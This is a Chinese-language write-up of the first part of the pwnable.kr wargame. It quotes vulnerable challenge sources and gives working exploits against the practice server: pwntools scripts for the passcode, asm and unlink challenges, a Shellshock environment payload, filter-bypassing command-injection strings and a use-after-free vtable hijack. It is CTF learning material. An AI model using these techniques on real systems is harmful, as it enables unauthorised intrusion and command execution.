# pwnable.kr first part


不想看毕设跑来摸鱼两天做完了第一部分，有些地方挺有意思的，但我忘了是哪些地方了...都简单写写吧

## fd

0：标准输入；1：标准输出；2：标准错误

## collision

略

## bof

栈溢出覆盖参数值

## flag

upx壳, `upx -d`

## passcode

```c
#include <stdio.h>
#include <stdlib.h>

void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
     scanf("%d", passcode2);

	printf("checking...\n");
	if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
		exit(0);
        }
}

void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}

int main(){
	printf("Toddler's Secure Login System 1.0 beta.\n");

	welcome();
	login();

	// something after login...
	printf("Now I can safely trust you that you have credential :)\n");
	return 0;	
}
```

直接运行简单输入的话会发生段错误。

仔细看`scanf`的两处，`scanf("%d", passcode1)`这句话会把输入的数字直接写入地址为`passcode1`的地方，而不是给`passcode1`赋值。

`welcome`和`login`被连续调用，都没有参数，两者的`ebp`相同。在`welcome`中输入的`name`足够长的话，会被`login`的栈复用。因此可以控制`passcode1`的初始值，即可以发生任意地址写。可以将后面调用的`fflush`got表的地址修改成`system("/bin/cat flag")`这一行的地址。

```python
#coding=utf-8

from pwn import *

s=ssh(host='pwnable.kr',port=2222,user='passcode',password='guest')
p=s.process('./passcode')
payload='a'* 0x60 + '\x04\xa0\x04\x08' + '134514147'
p.sendline(payload)
p.interactive()
p.close()
```

## random

`random = rand()`的值固定

## input

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main(int argc, char* argv[], char* envp[]){
	printf("Welcome to pwnable.kr\n");
	printf("Let's see if you know how to give input to program\n");
	printf("Just give me correct inputs then you will get the flag :)\n");

	// argv
	if(argc != 100) return 0;
	if(strcmp(argv['A'],"\x00")) return 0;
	if(strcmp(argv['B'],"\x20\x0a\x0d")) return 0;
	printf("Stage 1 clear!\n");	

	// stdio
	char buf[4];
	read(0, buf, 4);
	if(memcmp(buf, "\x00\x0a\x00\xff", 4)) return 0;
	read(2, buf, 4);
        if(memcmp(buf, "\x00\x0a\x02\xff", 4)) return 0;
	printf("Stage 2 clear!\n");
	
	// env
	if(strcmp("\xca\xfe\xba\xbe", getenv("\xde\xad\xbe\xef"))) return 0;
	printf("Stage 3 clear!\n");

	// file
	FILE* fp = fopen("\x0a", "r");
	if(!fp) return 0;
	if( fread(buf, 4, 1, fp)!=1 ) return 0;
	if( memcmp(buf, "\x00\x00\x00\x00", 4) ) return 0;
	fclose(fp);
	printf("Stage 4 clear!\n");	

	// network
	int sd, cd;
	struct sockaddr_in saddr, caddr;
	sd = socket(AF_INET, SOCK_STREAM, 0);
	if(sd == -1){
		printf("socket error, tell admin\n");
		return 0;
	}
	saddr.sin_family = AF_INET;
	saddr.sin_addr.s_addr = INADDR_ANY;
	saddr.sin_port = htons( atoi(argv['C']) );
	if(bind(sd, (struct sockaddr*)&saddr, sizeof(saddr)) < 0){
		printf("bind error, use another port\n");
    		return 1;
	}
	listen(sd, 1);
	int c = sizeof(struct sockaddr_in);
	cd = accept(sd, (struct sockaddr *)&caddr, (socklen_t*)&c);
	if(cd < 0){
		printf("accept error, tell admin\n");
		return 0;
	}
	if( recv(cd, buf, 4, 0) != 4 ) return 0;
	if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0;
	printf("Stage 5 clear!\n");

	// here's your flag
	system("/bin/cat flag");	
	return 0;
}
```

输入重定向、环境变量、socket通信等

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main()
{
    char *argv[101] = {0};
    char *envp[2] = {"\xde\xad\xbe\xef=\xca\xfe\xba\xbe", NULL};
    argv[0] = "/home/input2/input";
    for(int i = 1; i < 100; i++) {
        argv[i] = "a";
    }

    argv['A'] = "\x00";
    argv['B'] = "\x20\x0a\x0d";
    argv['C'] = "8888";
    argv[100] = NULL;

    FILE *fp = fopen("\x0a", "wb+");
    if(!fp){
        perror("Cannot open 0a");
        return -1;
    }
    fwrite("\x00\x00\x00\x00", 4, 1, fp);
    fclose(fp);

    fp = NULL;

    int pipe_stdin[2] = {-1,-1}, pipe_stderr[2] = {-1, -1};
    if(pipe(pipe_stdin) < 0 || pipe(pipe_stderr) < 0){
        perror("Cannot create pipe");
        return -2;
    }

    pid_t pid_child;
    if((pid_child = fork()) < 0) {
        perror("Cannot create child process");
    }
    if(pid_child == 0){ // 子进程
        sleep(1);
        close(pipe_stdin[0]);
        close(pipe_stderr[0]);
        write(pipe_stdin[1], "\x00\x0a\x00\xff", 4); // 信道写入端
        write(pipe_stderr[1], "\x00\x0a\x02\xff", 4);
    }else{
        close(pipe_stdin[1]);
        close(pipe_stderr[1]);
        dup2(pipe_stdin[0], 0); // 信道读取端
        dup2(pipe_stderr[0], 2);

        execve("/home/input2/input", argv, envp);
    }

    sleep(5);
    int sockfd;
    struct sockaddr_in saddr;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if(sockfd == -1){
        perror("Cannot create socket!");
        return -3;
    }
    saddr.sin_family = AF_INET;
	saddr.sin_addr.s_addr = inet_addr("127.0.0.1");
	saddr.sin_port = htons( atoi(argv['C']));
    if(connect(sockfd, (struct sockaddr*)&saddr, sizeof(saddr)) < 0){
        perror("Cannot connect to server");
        return -4;
    }
    write(sockfd, "\xde\xad\xbe\xef", 4);
    close(sockfd);

    return 0;
}
```

## leg

```c
#include <stdio.h>
#include <fcntl.h>
int key1(){
	asm("mov r3, pc\n");
}
int key2(){
	asm(
	"push	{r6}\n"
	"add	r6, pc, $1\n"
	"bx	r6\n"
	".code   16\n"
	"mov	r3, pc\n"
	"add	r3, $0x4\n"
	"push	{r3}\n"
	"pop	{pc}\n"
	".code	32\n"
	"pop	{r6}\n"
	);
}
int key3(){
	asm("mov r3, lr\n");
}
int main(){
	int key=0;
	printf("Daddy has very strong arm! : ");
	scanf("%d", &key);
	if( (key1()+key2()+key3()) == key ){
		printf("Congratz!\n");
		int fd = open("flag", O_RDONLY);
		char buf[100];
		int r = read(fd, buf, 100);
		write(0, buf, r);
	}
	else{
		printf("I have strong leg :P\n");
	}
	return 0;
}
```

arm的返回值存储在`r0`寄存器

```asm
(gdb) disass key1
Dump of assembler code for function key1:
   0x00008cd4 <+0>:	push	{r11}		; (str r11, [sp, #-4]!)
   0x00008cd8 <+4>:	add	r11, sp, #0
   0x00008cdc <+8>:	mov	r3, pc
   0x00008ce0 <+12>:	mov	r0, r3
   0x00008ce4 <+16>:	sub	sp, r11, #0
   0x00008ce8 <+20>:	pop	{r11}		; (ldr r11, [sp], #4)
   0x00008cec <+24>:	bx	lr
End of assembler dump.
(gdb) disass key2
Dump of assembler code for function key2:
   0x00008cf0 <+0>:	push	{r11}		; (str r11, [sp, #-4]!)
   0x00008cf4 <+4>:	add	r11, sp, #0
   0x00008cf8 <+8>:	push	{r6}		; (str r6, [sp, #-4]!)
   0x00008cfc <+12>:	add	r6, pc, #1
   0x00008d00 <+16>:	bx	r6
   0x00008d04 <+20>:	mov	r3, pc
   0x00008d06 <+22>:	adds	r3, #4
   0x00008d08 <+24>:	push	{r3}
   0x00008d0a <+26>:	pop	{pc}
   0x00008d0c <+28>:	pop	{r6}		; (ldr r6, [sp], #4)
   0x00008d10 <+32>:	mov	r0, r3
   0x00008d14 <+36>:	sub	sp, r11, #0
   0x00008d18 <+40>:	pop	{r11}		; (ldr r11, [sp], #4)
   0x00008d1c <+44>:	bx	lr
End of assembler dump.
(gdb) disass key3
Dump of assembler code for function key3:
   0x00008d20 <+0>:	push	{r11}		; (str r11, [sp, #-4]!)
   0x00008d24 <+4>:	add	r11, sp, #0
   0x00008d28 <+8>:	mov	r3, lr
   0x00008d2c <+12>:	mov	r0, r3
   0x00008d30 <+16>:	sub	sp, r11, #0
   0x00008d34 <+20>:	pop	{r11}		; (ldr r11, [sp], #4)
   0x00008d38 <+24>:	bx	lr
End of assembler dump.
```

计算一下key1,key2,key3结束时r0寄存器的值相加即可。

## mistake

```c
#include <stdio.h>
#include <fcntl.h>

#define PW_LEN 10
#define XORKEY 1

void xor(char* s, int len){
	int i;
	for(i=0; i<len; i++){
		s[i] ^= XORKEY;
	}
}

int main(int argc, char* argv[]){
	
	int fd;
	if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
		printf("can't open password %d\n", fd);
		return 0;
	}

	printf("do not bruteforce...\n");
	sleep(time(0)%20);

	char pw_buf[PW_LEN+1];
	int len;
	if(!(len=read(fd,pw_buf,PW_LEN) > 0)){
		printf("read error\n");
		close(fd);
		return 0;		
	}

	char pw_buf2[PW_LEN+1];
	printf("input password : ");
	scanf("%10s", pw_buf2);

	// xor your input
	xor(pw_buf2, 10);

	if(!strncmp(pw_buf, pw_buf2, PW_LEN)){
		printf("Password OK\n");
		system("/bin/cat flag\n");
	}
	else{
		printf("Wrong Password\n");
	}

	close(fd);
	return 0;
}
```

第17行，先比较大小再赋值给fd, fd=0所以后续直接从输入中获取数据......

## shellshock

CVE-2014-6271

漏洞大概是，Bash支持使用环境变量定义函数，如果环境变量以`(){`开头，则会被当作导入函数的定义，在shell启动时会生效。

[shellshock漏洞细节](https://blog.csdn.net/qq_20307987/article/details/51311910)

```shell
env var='() { :;}; /bin/cat flag' ./shellshock
```

## coin1

猜数字，直接二分法

## blackjack

赌注没做负数过滤

## lotto

没过滤相同的字符，输入6个相同的数字，只要有一个随机数等于这个数，就满足输出flag的条件了

## cmd1

```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "flag")!=0;
        r += strstr(cmd, "sh")!=0;
        r += strstr(cmd, "tmp")!=0;
        return r;
}
int main(int argc, char* argv[], char** envp){
        putenv("PATH=/thankyouverymuch");
        if(filter(argv[1])) return 0;
        system( argv[1] );
        return 0;
}
```

1. `./cmd1 '/bin/cat f*'`
2. `./cmd1 "/bin/cat \"f\"\"l\"\"a\"\"g\""`
3. 在tmp目录下写一个脚本`cat /home/cmd1/flag`然后`./cmd1 sc.sh`

## cmd2

```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "=")!=0;
        r += strstr(cmd, "PATH")!=0;
        r += strstr(cmd, "export")!=0;
        r += strstr(cmd, "/")!=0;
        r += strstr(cmd, "`")!=0;
        r += strstr(cmd, "flag")!=0;
        return r;
}

extern char** environ;
void delete_env(){
        char** p;
        for(p=environ; *p; p++) memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
        delete_env();
        putenv("PATH=/no_command_execution_until_you_become_a_hacker");
        if(filter(argv[1])) return 0;
        printf("%s\n", argv[1]);
        system( argv[1] );
        return 0;
}
```

增加了限制条件

1. 利用$(pwd): `cd /; /home/cmd2/cmd2 '$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)f*'`

2. 利用command -p参数

   ```
   command: command [-pVv] command [arg ...]
       Execute a simple command or display information about commands.
   
       Runs COMMAND with ARGS suppressing  shell function lookup, or display
       information about the specified COMMANDs.  Can be used to invoke commands
       on disk when a function with the same name exists.
   
       Options:
         -p    use a default value for PATH that is guaranteed to find all of
               the standard utilities
         -v    print a description of COMMAND similar to the `type' builtin
         -V    print a more verbose description of each COMMAND
   
       Exit Status:
       Returns exit status of COMMAND, or failure if COMMAND is not found.
   ```

   command的-p参数允许使用`PATH`中默认值，而不是程序设置的临时值

   `./cmd2 "command -p cat \"f\"\"l\"\"a\"\"g\""`

## uaf

```c
#include <fcntl.h>
#include <iostream> 
#include <cstring>
#include <cstdlib>
#include <unistd.h>
using namespace std;

class Human{
private:
	virtual void give_shell(){
		system("/bin/sh");
	}
protected:
	int age;
	string name;
public:
	virtual void introduce(){
		cout << "My name is " << name << endl;
		cout << "I am " << age << " years old" << endl;
	}
};

class Man: public Human{
public:
	Man(string name, int age){
		this->name = name;
		this->age = age;
        }
        virtual void introduce(){
		Human::introduce();
                cout << "I am a nice guy!" << endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a cute girl!" << endl;
        }
};

int main(int argc, char* argv[]){
	Human* m = new Man("Jack", 25);
	Human* w = new Woman("Jill", 21);

	size_t len;
	char* data;
	unsigned int op;
	while(1){
		cout << "1. use\n2. after\n3. free\n";
		cin >> op;

		switch(op){
			case 1:
				m->introduce();
				w->introduce();
				break;
			case 2:
				len = atoi(argv[1]);
				data = new char[len];
				read(open(argv[2], O_RDONLY), data, len);
				cout << "your data is allocated" << endl;
				break;
			case 3:
				delete m;
				delete w;
				break;
			default:
				break;
		}
	}

	return 0;	
}
```

查看Human, Man, Woman等的虚表，发现`give_shell`是第一项，`introduce`是第二项。

在new出来的Human结构体中，布局如下：`虚表指针 + age + name指针`

![image-20211103173746145](/images/pwnable_kr_1/image-20211103173746145.png)

攻击：

1. 3 -> free m,w这两个块
2. 2 -> new得到 w块，修改虚表指针的内容，改为原来的值-8，那么取第二项的时候实际会取到原来的第一项，即``give_shell`指针
3. 2 -> new得到 m块
4. 1 -> 调用`introduce`函数，实际调用到`give_shell`函数

## memcpy

```c
char* fast_memcpy(char* dest, const char* src, size_t len){
	size_t i;
	// 64-byte block fast copy
	if(len >= 64){
		i = len / 64;
		len &= (64-1);
		while(i-- > 0){
			__asm__ __volatile__ (
			"movdqa (%0), %%xmm0\n"
			"movdqa 16(%0), %%xmm1\n"
			"movdqa 32(%0), %%xmm2\n"
			"movdqa 48(%0), %%xmm3\n"
			"movntps %%xmm0, (%1)\n"
			"movntps %%xmm1, 16(%1)\n"
			"movntps %%xmm2, 32(%1)\n"
			"movntps %%xmm3, 48(%1)\n"
			::"r"(src),"r"(dest):"memory");
			dest += 64;
			src += 64;
		}
	}

	// byte-to-byte slow copy
	if(len) slow_memcpy(dest, src, len);
	return dest;
}
```

`movntps`和`movdqa`要求操作的内存地址必须为16字节对齐

## asm

有沙箱，只能用open, read, write

```python
from pwn import *
context(arch='amd64', os='linux')
s = ssh(host="pwnable.kr", user="asm", port=2222, password="guest")
if s.connected():
    p = s.connect_remote("127.0.0.1",9026)
    payload=shellcraft.open("flag")  
    # read file   
    payload+=shellcraft.read("rax", "rsp", 0x100)  
    # write stdout  
    payload+=shellcraft.write(1, "rsp", 0x100)  
    # p.recv(1024)  
    #gdb.attach(p)  
    p.send(asm(payload))  
    p.interactive()
    p.close()
```

## unlink

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
typedef struct tagOBJ{
	struct tagOBJ* fd;
	struct tagOBJ* bk;
	char buf[8];
}OBJ;

void shell(){
	system("/bin/sh");
}

void unlink(OBJ* P){
	OBJ* BK;
	OBJ* FD;
	BK=P->bk;
	FD=P->fd;
	FD->bk=BK;
	BK->fd=FD;
}
int main(int argc, char* argv[]){
	malloc(1024);
	OBJ* A = (OBJ*)malloc(sizeof(OBJ));
	OBJ* B = (OBJ*)malloc(sizeof(OBJ));
	OBJ* C = (OBJ*)malloc(sizeof(OBJ));

	// double linked list: A <-> B <-> C
	A->fd = B;
	B->bk = A;
	B->fd = C;
	C->bk = B;

	printf("here is stack address leak: %p\n", &A);
	printf("here is heap address leak: %p\n", A);
	printf("now that you have leaks, get shell!\n");
	// heap overflow!
	gets(A->buf);

	// exploit this unlink!
	unlink(B);
	return 0;
}
```

heap overflow + unlink实现任意写

本来想直接覆盖`unlink`函数的返回地址，修改成`shell`函数的起始地址，但是这样会导致`[Shell函数的起始地址+4 ] = Unlink的返回地址`，text段不可写会出错。也就是说只能够找两处可写的地址进行修改。

main函数结尾处的指令如下：

```
.text:080485FF 8B 4D FC                                mov     ecx, [ebp+var_4]
.text:08048602 C9                                      leave
.text:08048603 8D 61 FC                                lea     esp, [ecx-4]
.text:08048606 C3                                      retn
```

这里将栈中的内容赋值给ecx

leave相当于`mov esp, ebp; pop ebp`

然后又将`esp = ecx - 4`，即可以操控栈顶。

因此，可以构造 [ecx-4] = shell的起始地址，在retn的时候就可以转到shell处执行。

```python
from pwn import *
s = ssh(host="pwnable.kr", user="unlink", port=2222, password="guest")
if s.connected():
    p = s.process('/home/unlink/unlink')

    p.recvuntil("here is stack address leak: ")
    stack_base_str = p.recvuntil('\n')
    success("stack_base: " + stack_base_str)
    stack_base = int(stack_base_str, 16)

    p.recvuntil("here is heap address leak: ")
    heap_base_str = p.recvuntil('\n')
    success("heap_base: " + heap_base_str)
    heap_base = int(heap_base_str, 16)

    shell_addr = 0x080484EB
    payload = p32(shell_addr) + "a" * 12 + p32(stack_base + 16 - 4) + p32(heap_base + 12)
    p.sendline(payload)
    p.interactive()
    p.close()
```

## blukat

本来以为没啥入手点结果看别人wp说blukat和blukat_pwn两个用户在一个组里所以可以直接读password文件的内容...

## horcruxes

rop转到给的七个函数处打印出来各个变量的值然后求和

总和不能超过int所以需要循环试几次才能出flag
